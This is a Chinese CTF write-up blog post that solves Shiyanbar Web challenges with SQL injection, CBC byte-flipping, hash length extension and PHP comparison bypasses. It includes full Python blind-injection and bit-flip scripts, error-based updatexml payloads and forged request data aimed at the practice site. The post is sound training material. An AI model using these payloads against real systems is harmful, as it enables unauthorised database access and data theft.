---
title: 实验吧 Web 练习记录
date: 2019-07-26 21:15:13
tags:
  - Hash
  - SQLi
  - PHP
  - 古典密码与编码
  - 对称密码学
categories:
  - Web 安全
---

实验吧的 Web 题总体比 Bugku 难一些，主要难度在于几道注入题。

<!--more-->

## 简单的登录题
非常不友好的第一题。。

随便输入 id 发送并抓包，在请求包中的 cookie 中发现 `iv` 和 `cipher`，可以确定是对称密码题。。响应头中有个提示 `test.php`，访问得到一大段代码：

```php
define("SECRET_KEY", '***********');
define("METHOD", "aes-128-cbc");
error_reporting(0);
include('conn.php');
function sqliCheck($str){
	if(preg_match("/\\\|,|-|#|=|~|union|like|procedure/i",$str)){
		return 1;
	}
	return 0;
}
function get_random_iv(){
    $random_iv='';
    for($i=0;$i<16;$i++){
        $random_iv.=chr(rand(1,255));
    }
    return $random_iv;
}
function login($info){
	$iv = get_random_iv();
	$plain = serialize($info);
    $cipher = openssl_encrypt($plain, METHOD, SECRET_KEY, OPENSSL_RAW_DATA, $iv);
    setcookie("iv", base64_encode($iv));
    setcookie("cipher", base64_encode($cipher));
}
function show_homepage(){
	global $link;
    if(isset($_COOKIE['cipher']) && isset($_COOKIE['iv'])){
        $cipher = base64_decode($_COOKIE['cipher']);
        $iv = base64_decode($_COOKIE["iv"]);
        if($plain = openssl_decrypt($cipher, METHOD, SECRET_KEY, OPENSSL_RAW_DATA, $iv)){
            $info = unserialize($plain) or die("<p>base64_decode('".base64_encode($plain)."') can't unserialize</p>");
            $sql="select * from users limit".$info['id'].",0";
            $result=mysqli_query($link,$sql);

            if(mysqli_num_rows($result)>0  or die(mysqli_error($link))){
            	$rows=mysqli_fetch_array($result);
				echo '<h1><center>Hello!'.$rows['username'].'</center></h1>';
			}
			else{
				echo '<h1><center>Hello!</center></h1>';
			}
        }else{
            die("ERROR!");
        }
    }
}
if(isset($_POST['id'])){
    $id = (string)$_POST['id'];
    if(sqliCheck($id))
		die("<h1 style='color:red'><center>sql inject detected!</center></h1>");
    $info = array('id'=>$id);
    login($info);
    echo '<h1><center>Hello!</center></h1>';
}else{
    if(isset($_COOKIE["iv"])&&isset($_COOKIE['cipher'])){
        show_homepage();
    }else{
        echo '<body class="login-body"style="margin:0 auto">
                <div id="wrapper"style="margin:0 auto;width:800px;">
                    <form name="login-form"class="login-form"action=""method="post">
                        <div class="header">
                        <h1>Login Form</h1>
                        <span>input id to login</span>
                        </div>
                        <div class="content">
                        <input name="id"type="text"class="input id"value="id"onfocus="this.value=\'\'"/>
                        </div>
                        <div class="footer">
                        <p><input type="submit"name="submit"value="Login"class="button"/></p>
                        </div>
                    </form>
                </div>
            </body>';
    }
}
```

首先会对提交的参数 `id` 进行过滤防止 SQL 注入，随后会随机生成一个 `iv`，并根据序列化后的 `id` 生成明文并加密，加密方式为 `aes-128-cbc`。容易想到 CBC 字节翻转攻击。`iv` 和 `cipher` 这里都经过了 base64 编码。

如果没有提交参数 `id`，则执行与上述过程相反的解密过程得到明文。如果得到的明文无法反序列化，将直接返回其 base64；否则进行 sql 查询：
```sql
select * from users limit ?,0
```
这里的问号显然就是注入点了。尝试构造：
```sql
select * from users limit 1#,0
```
但是 `#` 和 `--` 两种注释符被过滤了，考虑使用 `%00`。先提交：
```
id=1;%00
```
得到 `iv` 和 `cipher`，然后设置到 cookie 里并去掉参数 `id` 再次提交，显示 `Hello!rootzz`，说明注入成功。

这同时也说明，我们可以通过修改 `iv` 和 `cipher` 控制 `id`，而 `iv` 和 `cipher` 是没有过滤的，所以可以成功绕过 `id` 的过滤机制。具体如何修改，也就是 CBC 字节翻转攻击的具体过程可以参考 [我的这篇博客](https://signormercurio.me/post/BugkuWeb/) 中的最后一题。

例如，我们提交 `id=12`，序列化后分组如下：
```
Block 0: a:1:{s:2:"id";s:
Block 1: 2:"12";}
```
可以看到，我们翻转第 0 组的**第 4 字节（从 0 开始计数）**，即可控制 `id=12` 中的 `2` 了。再比如，我们提交 `id=0 2nion select * from ((select 1)a join (select 2)b join (select 3)c);`（显然这里我们可以用 `join` 替换逗号，并且想把 `2` 换成 `u` 来绕过检测），序列化后分组如下：
```
Block 0: a:1:{s:2:"id";s:
Block 1: 70:"0 2nion sele
Block 2: ct * from ((sele
Block 3: ct 1)a join (sel
Block 4: ect 2)b join (se
Block 5: lect 3)c);
```
这里要翻转的变成了**第 6 字节**，而如果 payload 长度大于等于 100，则需要翻转**第 7 字节**了。

此外，需要注意在 payload 末尾添加 `%00`。如果直接添加可能会被二次 URL 编码，因此可以用 `chr(0)` 来添加。完整脚本：

```python
import base64
import urllib
import requests
import re

def login(payload, i, old, new):
    url = r'http://ctf5.shiyanbar.com/web/jiandan/index.php'
    data = {'id': payload}
    r = requests.post(url=url, data=data)
    sc = r.headers['Set-Cookie']

    cipher = re.findall(r'cipher=(.*)', sc)[0]
    iv = re.findall(r'iv=(.*),', sc)[0]
    # print(cipher)
    # print(iv)

    cd = base64.b64decode(urllib.parse.unquote(cipher))
    ivd = base64.b64decode(urllib.parse.unquote(iv))

    ch = bytes([cd[i] ^ ord(new) ^ ord(old)])
    cd = cd[:i] + ch + cd[i+1:]
    cnew = urllib.parse.quote(base64.b64encode(cd))
    # print(cnew)

    cookie0 = {'iv': iv, 'cipher': cnew}
    r = requests.post(url=url, cookies=cookie0)
    plain = re.findall(r"base64_decode\('(.*)'\)", r.text)[0]
    pd = base64.b64decode(plain)

    block0 = 'a:1:{s:2:"id";s:'
    for i in range(16):
        ch = bytes([ivd[i] ^ pd[i] ^ ord(block0[i])]) # Using bytes([int]) here is important
        ivd = ivd[:i] + ch + ivd[i+1:]
    ivnew = urllib.parse.quote(base64.b64encode(ivd))
    # print(ivnew)

    cookie1 = {'iv': ivnew, 'cipher': cnew}
    r = requests.post(url=url, cookies=cookie1)
    print(r.text)

# login('12', 4, '#', '2')
# login('0 2nion select * from ((select 1)a join (select 2)b join (select 3)c);'+ chr(0), 6, '2', 'u')
login('0 2nion select * from ((select 1)a join (select group_concat(table_name) from information_schema.tables where table_schema regexp database())b join (select 3)c);'+ chr(0), 7, '2', 'u')
# users, you_want
login('0 2nion select * from ((select 1)a join (select group_concat(column_name) from information_schema.columns where table_name regexp "you_want")b join (select 3)c);'+ chr(0), 7, '2', 'u')
# value
login('0 2nion select * from ((select 1)a join (select value from you_want)b join (select 3)c);'+ chr(0), 6, '2', 'u')
```


忘了提及的一点是，过滤了等号，可以通过 `regexp` 绕过。

这题放在 Web 第一题实在是太劝退了。

## 后台登录
F12 找到：
```php
$password=$_POST['password'];
$sql = "SELECT * FROM admin WHERE username ='admin'and password ='".md5($password,true)."'";
$result=mysqli_query($link,$sql);
	if(mysqli_num_rows($result)>0){
		echo 'flag is :'.$flag;
	}
	else{
		echo '密码错误!';
  }
```
这里比较有意思的是在 SQL 注入中引入了哈希函数。其中 `md5($password, true)` 返回一个字符串。

因此我们需要构造一个字符串，使得其 md5 值由 16 进制转为字符串后，包含 `'or'num`（`num` 为任意数字），这样就可以组成 SQL 语句：
```sql
and password = ''or'num'
```
例如，对于字符串 `ffifdyop`，其 md5 值为 `276f722736c95d99e921722cf9ed621c`，对应字符串开头为 `'or'6`，因此 SQL 语句执行结果为 `true`，成功登录。

## 加了料的报错注入
这题比较有趣的是，`username` 中过滤了 `()`，而 `password` 中过滤了很多报错注入用的函数名。因此可以考虑将两者拼接，在 `username` 中使用函数但把 `()` 移动到 `password` 里，最后注释掉中间的 SQL 语句。此外，`password` 还过滤了 `=`，用双重否定绕过即可。
```
username='and updatexml/*&password=*/(1,concat(0x7e,(select database()),0x7e),1) or '1
# XPATH syntax error: '~error_based_hpf~'

username='and updatexml/*&password=*/(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where !(table_schema<>'error_based_hpf')),0x7e),1) or '1
# XPATH syntax error: '~ffll44jj,users~'

username='and updatexml/*&password=*/(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where !(table_name<>'ffll44jj')),0x7e),1) or '1
# XPATH syntax error: '~value~'

username='and updatexml/*&password=*/(1,concat(0x7e,(select value from ffll44jj),0x7e),1) or '1
# XPATH syntax error: '~flag{err0r_b4sed_sqli_+_hpf}~'
```

另外，本题也可以用 `exp` 和 `extractvalue` 函数。

## 认真一点！
过滤了 `and`，`union`，空格，逗号等等，`or` 需要双写绕过。之后进行布尔盲注。
爆数据库名长度：
```python
import requests

success = 'You are in'
url = 'http://ctf5.shiyanbar.com/web/earnest/index.php'

for i in range(1, 30):
  data = {'id':"0'oorr(length(database())=%s)oorr'0" % i}
  print(data)
  r = requests.post(url, data=data)
  if success in r.text:
    print('Finished, len = %s' % i)
    break
```
得到数据库名长度为 18。爆数据库名：
```python
import requests
import string

success = 'You are in'
url = 'http://ctf5.shiyanbar.com/web/earnest/index.php'
chrset = string.digits + string.ascii_lowercase + '_!~'
db = ''

for i in range(1, 19):
  for j in chrset:
    data = {'id':"0'oorr(mid(database()from(%s)foorr(1))='%s')oorr'0" % (i,j)}
    print(data)
    r = requests.post(url, data=data)
    if success in r.text:
      db += j
      print(db)
      break
```

得到数据库名 `ctf_sql_bool_blind`。爆表名长度：
```python
import requests
import string

success = 'You are in'
url = 'http://ctf5.shiyanbar.com/web/earnest/index.php'
chrset = string.digits + string.ascii_lowercase + '_!~'
i = 1

while True:
  val = "0'oorr((select(mid(group_concat(table_name separatoorr'@')from(%s)foorr(1)))from(infoorrmation_schema.tables)where(table_schema)=database())='')oorr'0" % i
  data = {'id': val.replace('', chr(0x0a))}
  print(data)
  r = requests.post(url, data=data)
  if success in r.text:
    print('Finished, len = %s' % i)
    break
  i += 1
```

得到所有表名连接起来后，包含分隔符 `@` 的总长为 10。爆表名：
```python
import requests
import string

success = 'You are in'
url = 'http://ctf5.shiyanbar.com/web/earnest/index.php'
chrset = string.digits + string.ascii_lowercase + '_!~@'
table = ''

for i in range(1, 12):
  for j in chrset:
    val = "0'oorr((select(mid(group_concat(table_name separatoorr'@')from(%s)foorr(1)))from(infoorrmation_schema.tables)where(table_schema)=database())='%s')oorr'0" % (i, j)
    data = {'id': val.replace('', chr(0x0a))}
    print(data)
    r = requests.post(url, data=data)
    if success in r.text:
      table += j
      print(table)
      break
```

得到表名 `fiag` 和 `users`，显然前者是我们需要的。用同样的方法爆列名长度和列名 `fl$4g`。最后爆 flag 内容的长度：
```python
import requests
import string

success = 'You are in'
url = 'http://ctf5.shiyanbar.com/web/earnest/index.php'
chrset = string.digits + string.ascii_lowercase + r'_~=+-*/{\}?!:@#$%&()[],.'
i = 1

while True:
  val = "0'oorr((select(mid((fl$4g)from(%s)foorr(1)))from(fiag))='')oorr'0" % i
  data = {'id': val.replace('', chr(0x0a))}
  print(data)
  r = requests.post(url, data=data)
  if success in r.text:
    print('Finished, len = %s' % i)
    break
  i += 1
```

得长度为 13，爆 flag 内容：
```python
import requests
import string

success = 'You are in'
url = 'http://ctf5.shiyanbar.com/web/earnest/index.php'
chrset = string.digits + string.ascii_lowercase + r'_~=+-*/{\}?!:@#$%&()[],.'
flag = ''

for i in range(1, 14):
  for j in chrset:
    val = "0'oorr((select(mid((fl$4g)from(%s)foorr(1)))from(fiag))='%s')oorr'0" % (i, j)
    data = {'id': val.replace('', chr(0x0a))}
    print(data)
    r = requests.post(url, data=data)
    if success in r.text:
      flag += j
      print(flag)
      break
```

得到 `flag{haha~you`，很明显并不完整。将数字改大后再跑一次，得到 `flag{haha~you-win}----`，注意到右花括号后面是若干个 `-`，应该忽略。提交后发现答案错误。

这时候就需要考虑右花括号后面全都是 `-` 的原因了。我们构造的 payload，简化后写出来就是：
```
"0' or (select mid(fl$4g from(i) for(1)) from fiag) = '-' or '0
```

其中 `i` 是数字，表示 `fl$4g` 的第 `i` 个字符。当显示 `You are in` 时停止，也就是说此时，下面这个值为 `True`：
```sql
(select mid(fl$4g from(i) for(1)) from fiag) = '-'
```
当 `i` 大于等于 20 时，显然此时 `fl$4g` 这一列的对应内容已经为空了，但是却依然能等于 `-`。这说明服务端通过某种方式将空格转义成了 `-`。因此真正的 flag 应该进行反转义，得到 `flag{haha~you win!}`。


## 你真的会 PHP 吗？
响应头中有提示 `6c525af4059b4fe7d8c33a.txt`，得到代码：

```php
<?php

$info = "";
$req = [];
$flag="xxxxxxxxxx";

ini_set("display_error", false);
error_reporting(0);

if(!isset($_POST['number'])){
   header("hint:6c525af4059b4fe7d8c33a.txt");

   die("have a fun!!");
}

foreach([$_POST] as $global_var) {
    foreach($global_var as $key => $value) {
        $value = trim($value);
        is_string($value) && $req[$key] = addslashes($value);
    }
}

function is_palindrome_number($number) {
    $number = strval($number);
    $i = 0;
    $j = strlen($number) - 1;
    while($i < $j) {
        if($number[$i] !== $number[$j]) {
            return false;
        }
        $i++;
        $j--;
    }
    return true;
}

if(is_numeric($_REQUEST['number'])){

   $info="sorry, you cann't input a number!";

}elseif($req['number']!=strval(intval($req['number']))){

     $info = "number must be equal to it's integer!! ";

}else{

     $value1 = intval($req["number"]);
     $value2 = intval(strrev($req["number"]));

     if($value1!=$value2){
          $info="no, this is not a palindrome number!";
     }else{

          if(is_palindrome_number($req["number"])){
              $info = "nice! {$value1} is a palindrome number!";
          }else{
             $info=$flag;
          }
     }

}

echo $info;
```

随后就是源码审计了，`number` 不能为空且需要绕过 `is_numeric`，同时还不能是回文数，但是将这个数前后颠倒得到的数值应等于它本身。

在 32 位系统上运行的 PHP 会把大于 2147483647 的数值认为是等于 2147483647 的，因此 2147483647 前后颠倒，对 PHP 来说其数值等于它本身。最后用 `%00` 绕过 `is_numeric` 即可，payload：`2147483647%00`。

## 登陆一下好吗？？
能过滤的都过滤了，利用万能密码 `'='`。原理：
```sql
where username = ''=''and password =''=''
```
其中 `username=''` 结果为 `false`，这和空字符串被认为是相等的。

## 因缺斯汀的绕过
[参考博客，包含关于 rollup 的生动阐释](https://blog.csdn.net/qq_35078631/article/details/54772798)

F12 发现 `source.txt`：

```php
<?php
error_reporting(0);

if (!isset($_POST['uname']) || !isset($_POST['pwd'])) {
	echo '<form action=""method="post">'."<br/>";
	echo '<input name="uname"type="text"/>'."<br/>";
	echo '<input name="pwd"type="text"/>'."<br/>";
	echo '<input type="submit"/>'."<br/>";
	echo '</form>'."<br/>";
	echo '<!--source: source.txt-->'."<br/>";
    die;
}

function AttackFilter($StrKey,$StrValue,$ArrReq){
    if (is_array($StrValue)){
        $StrValue=implode($StrValue);
    }
    if (preg_match("/".$ArrReq."/is",$StrValue)==1){
        print "姘村彲杞借垷锛屼害鍙禌鑹囷紒";
        exit();
    }
}

$filter = "and|select|from|where|union|join|sleep|benchmark|,|\(|\)";
foreach($_POST as $key=>$value){
    AttackFilter($key,$value,$filter);
}

$con = mysql_connect("XXXXXX","XXXXXX","XXXXXX");
if (!$con){
	die('Could not connect:' . mysql_error());
}
$db="XXXXXX";
mysql_select_db($db, $con);
$sql="SELECT * FROM interest WHERE uname ='{$_POST['uname']}'";
$query = mysql_query($sql);
if (mysql_num_rows($query) == 1) {
    $key = mysql_fetch_array($query);
    if($key['pwd'] == $_POST['pwd']) {
        print "CTF{XXXXXX}";
    }else{
        print "浜﹀彲璧涜墖锛�";
    }
}else{
	print "涓€棰楄禌鑹囷紒";
}
mysql_close($con);
?>
```

可以看到过滤了很多注入关键字以及数组绕过等姿势，随后根据用户输入的 `uname` 去查询数据库中的 `pwd`，然后和用户 POST 的 `pwd` 比较，一致则通过。注意到这里也是一个弱等号，因此可以考虑空值绕过。还要注意查询输出的结果必须只有一行。

先查看表里一共有几行数据：
```
1' or 1 limit 1 offset 0#
1' or 1 limit 1 offset 1#
1' or 1 limit 1 offset 2#
```

前两条都返回 ` 浜﹀彲璧涜墖锛�`，而第三条返回 ` 涓€棰楄禌鑹囷紒 `（这里的乱码是因为编码问题，懒得转换了），因此表里一共只有两条数据。那么怎么插入一条新的数据，使得其中的 `pwd` 为 `NULL` 呢？

我们可以利用 `rollup` 统计功能实现。构造 payload：
```
1' or 1 group by pwd with rollup limit 1 offset 2#
```
注意这里的顺序。先 `group by pwd with rollup` 插入一条 `pwd` 为 `NULL` 的统计数据，然后 `limit 1 offset 2` 取最新的这一条数据。此时，由于我们 POST 的 `pwd` 也是空，因此通过验证。

## 简单的 sql 注入之 3/2/1
第三题 sqlmap 报错注入。

第二题还是 sqlmap，不过由于过滤空格（和右括号）需要 `--tamper=space2comment`。

不知道为什么第一题似乎和第二题一样。

## 天下武功唯快不破
```python
import requests
import base64

url = 'http://ctf5.shiyanbar.com/web/10/10.php'
response = requests.get(url)

flag = base64.b64decode(response.headers['FLAG']).decode().split(':')[1]

data = {'key': flag}
res = requests.post(url=url, data=data)
print(res.text)
```

## 让我进去
抓包发现 cookie 中存在 `source=0`，改为 1 即可查看源码：

```php
$flag = "XXXXXXXXXXXXXXXXXXXXXXX";
$secret = "XXXXXXXXXXXXXXX"; // This secret is 15 characters long for security!

$username = $_POST["username"];
$password = $_POST["password"];

if (!empty($_COOKIE["getmein"])) {
    if (urldecode($username) === "admin" && urldecode($password) != "admin") {
        if ($COOKIE["getmein"] === md5($secret . urldecode($username . $password))) {
            echo "Congratulations! You are a registered user.\n";
            die ("The flag is". $flag);
        }
        else {
            die ("Your cookies don't match up! STOP HACKING THIS SITE.");
        }
    }
    else {
        die ("You are not an admin! LEAVE.");
    }
}

setcookie("sample-hash", md5($secret . urldecode("admin"."admin")), time() + (60 * 60 * 24 * 7));

if (empty($_COOKIE["source"])) {
    setcookie("source", 0, time() + (60 * 60 * 24 * 7));
}
else {
    if ($_COOKIE["source"] != 0) {
        echo ""; // This source code is outputted here
    }
}
```

可以看到，我们需要设置 cookie 中的 `getmein` 为 `secret||username||password` 的 MD5 值，其中 `username` 为 `admin`，`password` 不能为 `admin`，且 `secret` 未知，但长度为 15 字节。

我们还知道，数据包中的 `sample-hash` 的值就是 `secret||'admin'||'admin'` 的 MD5 值，而这个值是已知的。因此，这显然是哈希长度扩展攻击的模板题。参考 [哈希长度扩展攻击](https://signormercurio.me/post/HashLenExtAtk/)。具体命令：
```bash
./hash_extender --data admin --secret 20 --append append --signature 571580b26c65f306376d4f64e53cb5c7 --format md5
```

**注意**这里 `secret` 长度为题目给出的 15 加上 `admin` 的长度 5，结果：
```
Type: md5
Secret length: 20
New signature: 83f2684d54049c211e191f27902caaaf
New string: 61646d696e80000000000000000000000000000000000000000000000000000000000000c800000000000000617070656e64
```

因此在 cookie 中设置 `getmein=83f2684d54049c211e191f27902caaaf`，POST 数据为：
```
username=admin&password=admin%80%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%c8%00%00%00%00%00%00%00append
```

发包后得到 flag。

## 拐弯抹角
仔细读它给的注释，可以想到 `index.php/index.php` 的方式。

## Forms
抓包发现存在 `showsource` 参数，改成 1 就能看到源码，`PIN` 码被写死在代码里了。

## 天网管理系统
F12 看到登录判断代码，是需要用户名 md5 值为 0，任意选一个 md5 以 `0e` 开头的字符串就会被当作是 0 处理。登录后得到一个 url，访问得到：
```php
$unserialize_str = $_POST['password'];
$data_unserialize = unserialize($unserialize_str);
if($data_unserialize['user'] =='???'&& $data_unserialize['pass']=='???')
{
  print_r($flag);
}
```
得到关于 `password` 的提示，这里利用弱等于漏洞，直接让 `user` 和 `pass` 都为 `true` 即可。payload:
```php
username=admin&password=a:2:{s:4:"user";b:1;s:4:"pass";b:1;}
```

## 忘记密码了
随便填个邮箱地址，在源代码中发现这样两行：
```html
<meta name="admin"content="admin@simplexue.com"/>
<meta name="editor"content="Vim"/>
```

第二行的 `vim` 一般指 Vim 编辑器，容易联想到它产生的备份文件 `.swp`，可能在网站目录下存在这类文件。而第一行的邮箱显然就是我们需要的管理员邮箱了。

此外还能得到提示：下一步跳转到 `step2.php`，接收一个 `email` 参数和一个 `check` 参数。如果随意填写 `check` 参数则会显示 `check error` 然后返回 `step1.php`。

抓包访问 `step2.php`，查看源码，注意到它会提交请求到 `submit.php`，而如果直接访问则会得到 `you are not an admin`。因此考虑获取三个页面中某一个的源码，尝试 `.step1.php.swp` 和 `.step2.php.swp` 无果，但是存在 `.submit.php.swp`。核心代码：
```php
if(!empty($token)&&!empty($emailAddress)){
	if(strlen($token)!=10) die('fail');
	if($token!='0') die('fail');
	$sql = "SELECT count(*) as num from `user` where token='$token' AND email='$emailAddress'";
	$r = mysql_query($sql) or die('db error');
	$r = mysql_fetch_assoc($r);
	$r = $r['num'];
	if($r>0){
		echo $flag;
	}else{
		echo "失败了呀";
	}
}
```

这里要求 `token` 长度为 10 且值等于 0，可以直接令其等于 `0000000000`（`0e` 绕过应该也行）。最终 payload：
```
http://ctf5.shiyanbar.com/10/upload/submit.php?emailAddress=admin@simplexue.com&token=0000000000
```

## Once More
首先拿到源代码：
```php
<?php
if (isset ($_GET['password'])) {
	if (ereg ("^[a-zA-Z0-9]+$", $_GET['password']) === FALSE)
	{
		echo '<p>You password must be alphanumeric</p>';
	}
	else if (strlen($_GET['password']) <8 && $_GET['password']> 9999999)
	{
		if (strpos ($_GET['password'],'*-*') !== FALSE)
		{
			die('Flag:' . $flag);
		}
		else
		{
			echo('<p>*-* have not been found</p>');
		}
	}
	else
	{
		echo '<p>Invalid password</p>';
	}
}
?>
```

代码先检查传入的密码是否是由字母和数字构成，然后限制了长度小于 8 但值大于 9999999，最后密码中需要含有 `*-*`。

题目提示 `ereg` 函数存在漏洞，猜测这里是利用 `%00` 截断，构造 `password=1e9%00*-*` 即可绕过。需要注意的是，如果直接在输入框输入，`%00` 会被二次 URL 编码。

## GuessNextSession
这题属于错误出题的典范，直接点 Guess 就可以出答案。。。为什么呢？还是先看源码：
```php
<?php
session_start();
if (isset ($_GET['password'])) {
    if ($_GET['password'] == $_SESSION['password'])
        die ('Flag:'.$flag);
    else
        print '<p>Wrong guess.</p>';
}

mt_srand((microtime() ^ rand(1, 10000)) % rand(1, 10000) + rand(1, 10000));
?>
```
这里要求参数 `password` 和 `session` 中的 `password` 相同，而且是弱等号，所以当我们清空 cookie，什么都不填直接提交时，弱等号比较必定返回 `true`。

## FALSE
数组绕过 SHA1 碰撞。

## NSCTF web200
根据加密函数写解密函数，这里感觉用 PHP 比用 Python 要简单一点：
```php
<?php
function decode($str) {
	$_o = base64_decode(strrev(str_rot13($str)));
	$_ = '';
	for ($_0 = 0; $_0 < strlen($_o); ++$_0) {
		$_c = substr($_o, $_0, 1);
		$__ = ord($_c) - 1;
		$_c = chr($__);
		$_ .= $_c;
	}
	return strrev($_);
}

echo decode('a1zLbgQsCESEIqRLwuQAyMwLyq2L5VwBxqGA3RQAyumZ0tmMvSGM2ZwB4tws');
?>
```
这里的技巧是 `rot13` 加密两次后会恢复出原来的明文，所以其解密和加密用的是同一个函数。

## 程序逻辑问题
F12 发现 `index.txt`，核心代码：
```php
<?php

if($_POST[user] && $_POST[pass]) {
	$conn = mysql_connect("********", "*****", "********");
	mysql_select_db("phpformysql") or die("Could not select database");
	if ($conn->connect_error) {
		die("Connection failed:" . mysql_error($conn));
}
$user = $_POST[user];
$pass = md5($_POST[pass]);

$sql = "select pw from php where user='$user'";
$query = mysql_query($sql);
if (!$query) {
	printf("Error: %s\n", mysql_error($conn));
	exit();
}
$row = mysql_fetch_array($query, MYSQL_ASSOC);
//echo $row["pw"];

  if (($row[pw]) && (!strcasecmp($pass, $row[pw]))) {
	echo "<p>Logged in! Key:************** </p>";
}
else {
    echo("<p>Log in failure!</p>");
  }
}
?>
```
这里会将 `pass` 参数 MD5 后赋值给 `pass` 变量，但 username 没有过滤，存在注入。构造 payload：
```
username=-1'union select md5(1)#&password=1
```
使得 `pass` 的值经过 MD5 后与查询结果相同，即可登录。

## what a fuck! 这是什么鬼东西?
jsfuck 直接控制台运行。

## PHP 大法
根据提示拿到源码：
```php
<?php
if(eregi("hackerDJ",$_GET[id])) {
  echo("<p>not allowed!</p>");
  exit();
}

$_GET[id] = urldecode($_GET[id]);
if($_GET[id] == "hackerDJ")
{
  echo "<p>Access granted!</p>";
  echo "<p>flag: *****************} </p>";
}
?>
```
二次 URL 编码绕过。

## 貌似有点难
XFF 头伪造 IP 为 `1.1.1.1`。

## 头有点大
修改请求头中的 `User-agent` 和 `Accept-Language`：
```
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; .NET CLR 9.9)
Accept-Language: en-gb,en;q=0.9
```

## 猫抓老鼠
抓包发现异常字段 `Content-Row`，长得像 base64 但并不需要解码，直接填在 `pass_key` 里提交就好。

## 看起来有点难
这题如果不用 admin 登录，会显示数据库连接失败，看起来就像题被打了一样。

所以跑 sqlmap 用的 url 中，用户名必须是 `admin`，比如 `http://ctf5.shiyanbar.com/basic/inject/index.php?admin=admin&pass=admin&action=login`。其它没有什么坑点。